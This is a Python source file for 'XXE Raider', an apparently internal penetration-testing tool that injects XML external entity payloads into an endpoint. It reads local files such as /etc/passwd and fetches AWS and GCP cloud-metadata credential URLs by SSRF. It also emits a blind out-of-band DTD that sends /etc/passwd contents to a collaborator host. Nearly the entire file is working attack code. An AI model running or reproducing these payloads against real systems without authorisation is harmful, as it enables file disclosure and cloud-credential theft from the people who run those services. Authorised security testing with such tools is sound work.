#!/usr/bin/env python3
"""
xxe_raider.py — XML External Entity (XXE) injection (INTERNAL edition).

Finds XML-parsing endpoints that resolve external entities: local file read
(file:///etc/passwd, C:/Windows/win.ini), SSRF via XXE (cloud metadata,
internal services), and out-of-band exfiltration when you point it at a
collaborator you control.

It never guesses. First it runs a *differential entity-expansion probe*: a
harmless internal entity with a unique canary. If — and only if — that canary
comes back expanded does the parser resolve entities at all; a target that
echoes the literal `&xxe;` is not vulnerable and is reported as such. File-read
and SSRF hits are confirmed by fingerprinting the fetched content *after*
stripping the payload echo, so a target that merely reflects your request URL
is never mis-flagged.

    # POST an XML body the app already accepts, with a {XXE} placeholder
    python TOOLS/xxe_raider.py --url http://127.0.0.1:8080/api/import \
        --template '<?xml version="1.0"?>{DOCTYPE}<order><item>{XXE}</item></order>'

    # Default template (generic <root><data>&xxe;</data></root>)
    python TOOLS/xxe_raider.py --url http://127.0.0.1:8080/xml

    # SSRF-via-XXE against a self origin you control
    python TOOLS/xxe_raider.py --url http://host/xml --self http://127.0.0.1:8080

    # Out-of-band DTD (blind XXE) — point at a collaborator you own
    python TOOLS/xxe_raider.py --url http://host/xml --collab http://oob.you.example
"""
import argparse
import os
import sys
import urllib.error
import urllib.request
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool
from privacy_guard import privacy_user_agent

# Default template. {DOCTYPE} is where the entity declaration goes, {XXE} is
# where the entity reference (&xxe;) lands so its expansion is reflected.
DEFAULT_TEMPLATE = '<?xml version="1.0" encoding="UTF-8"?>{DOCTYPE}<root><data>{XXE}</data></root>'

# file:// targets by platform — we try both; only the real one fingerprints.
FILE_TARGETS = [
    ("unix /etc/passwd", "file:///etc/passwd", ("root:x:0:0", "daemon:x:")),
    ("unix /etc/hostname", "file:///etc/hostname", None),
    ("win win.ini", "file:///C:/Windows/win.ini", ("[fonts]", "[extensions]", "for 16-bit")),
]

# SSRF-via-XXE metadata/internal targets and the content that proves a real fetch.
def ssrf_targets(self_origin):
    t = [
        ("AWS IMDS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         ("iam/security-credentials", "AKIA", "ASIA")),
        ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/",
         ("computeMetadata", "instance/")),
    ]
    if self_origin:
        t.append(("self internal canary", self_origin.rstrip("/") + "/internal/creds",
                  ("brk_internal", "brk_iam", "SecretAccessKey")))
    return t


class XXERaider(VibeTool):
    def __init__(self, url, template):
        super().__init__("XXE Raider", "XML External Entity Injection")
        self.url = url
        self.template = template
        self.findings = 0
        self.expansion = False

    def _post_xml(self, body, ctype="application/xml"):
        try:
            req = urllib.request.Request(
                self.url, data=body.encode("utf-8"), method="POST",
                headers={"Content-Type": ctype,
                         "User-Agent": privacy_user_agent("XXE Raider")})
            with urllib.request.urlopen(req, timeout=8) as r:
                return r.getcode(), r.read(16000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(16000).decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)

    def _build(self, doctype, reference):
        return self.template.replace("{DOCTYPE}", doctype).replace("{XXE}", reference)

    def _expansion_probe(self):
        """Differential: does the parser expand an internal entity at all?"""
        canary = "brkxxe" + uuid.uuid4().hex[:12]
        doctype = f'<!DOCTYPE root [<!ENTITY xxe "{canary}">]>'
        body = self._build(doctype, "&xxe;")
        st, resp = self._post_xml(body)
        # Literal reference echoed back => not expanded. Canary present but the
        # literal &xxe; absent => the parser resolved our internal entity.
        if canary in resp and "&xxe;" not in resp:
            self.expansion = True
            self.log("Entity expansion CONFIRMED — parser resolves internal entities "
                     "(external entities are worth testing).", "warn")
        elif "&xxe;" in resp or canary not in resp:
            self.log("No entity expansion — parser echoes literal &xxe; or drops it. "
                     "External entities almost certainly disabled.", "pass")
        else:
            self.log("Entity-expansion probe inconclusive (canary not reflected); "
                     "testing external entities blind.", "info")

    def _confirm(self, resp, payload, fingerprints):
        """A hit only if a fingerprint survives stripping the reflected payload."""
        content = resp.replace(payload, "")
        if any(bad in resp.lower() for bad in ("not well-formed", "parse error",
                                               "doctype is not allowed", "entity is not defined",
                                               "external entities", "disallow-doctype")):
            return False
        return any(fp in content for fp in fingerprints)

    def _try_file_read(self):
        for label, uri, fps in FILE_TARGETS:
            fingerprints = fps or ()
            doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{uri}">]>'
            body = self._build(doctype, "&xxe;")
            st, resp = self._post_xml(body)
            if fingerprints and self._confirm(resp, uri, fingerprints):
                self.log(f"XXE FILE READ CONFIRMED — {label} disclosed via {uri}", "hack")
                snippet = next((resp[resp.find(fp):resp.find(fp) + 80]
                                for fp in fingerprints if fp in resp), "")
                self.log(f"  leaked: {snippet.strip()!r}", "crit")
                self.findings += 1

    def _try_ssrf(self, self_origin):
        for label, uri, fps in ssrf_targets(self_origin):
            doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{uri}">]>'
            body = self._build(doctype, "&xxe;")
            st, resp = self._post_xml(body)
            if self._confirm(resp, uri, fps):
                self.log(f"SSRF-via-XXE CONFIRMED — server fetched {label} ({uri})", "hack")
                self.findings += 1
            elif label.startswith(("AWS", "GCP")) and st == 200:
                self.log(f"  {label}: parser accepted the external SYSTEM entity but no "
                         f"metadata content returned (may be egress-filtered).", "info")

    def _emit_oob_dtd(self, collab):
        """Blind XXE: print the parameter-entity DTD to host on your collaborator."""
        collab = collab.rstrip("/")
        marker = uuid.uuid4().hex[:10]
        evil = (f'<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
                f'<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'{collab}/{marker}/%file;\'>">\n'
                f'%eval;\n%exfil;')
        doctype = f'<!DOCTYPE root [<!ENTITY % dtd SYSTEM "{collab}/{marker}.dtd"> %dtd;]>'
        body = self._build(doctype, "")
        st, _ = self._post_xml(body)
        self.log("Out-of-band (blind) XXE fired. Host this DTD on your collaborator "
                 f"at {collab}/{marker}.dtd :", "warn")
        self.log("  " + evil.replace("\n", "\n  "), "info")
        self.log(f"Then watch {collab}/{marker}/ for an inbound request carrying the "
                 "file contents. A hit there confirms blind XXE.", "info")

    def run(self, self_origin, collab):
        self.banner()
        self.log(f"Target: {self.url}")
        self._expansion_probe()
        self._try_file_read()
        self._try_ssrf(self_origin)
        if collab:
            self._emit_oob_dtd(collab)
        self.log("=" * 40)
        if self.findings:
            self.log(f"XXE SWEEP COMPLETE — {self.findings} confirmed external-entity finding(s)", "hack")
        elif self.expansion:
            self.log("Entities expand but no external fetch confirmed — external entity "
                     "resolution may be disabled while internal is not.", "pass")
        else:
            self.log("No XXE confirmed — endpoint isn't resolving external entities.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="XXE Raider - XML external entity injection")
    p.add_argument("--url", required=True, help="XML-accepting endpoint (POST)")
    p.add_argument("--template", default=DEFAULT_TEMPLATE,
                   help="XML body template with {DOCTYPE} and {XXE} placeholders")
    p.add_argument("--self", dest="self_origin", default="",
                   help="Your target's own origin for a same-host SSRF canary")
    p.add_argument("--collab", default="",
                   help="Collaborator origin you control, to emit a blind/OOB XXE DTD")
    p.add_argument("-v", "--version", action="version", version="XXE Raider 1.0.0")
    args = p.parse_args(argv)
    return XXERaider(args.url, args.template).run(args.self_origin, args.collab)


if __name__ == "__main__":
    raise SystemExit(main())
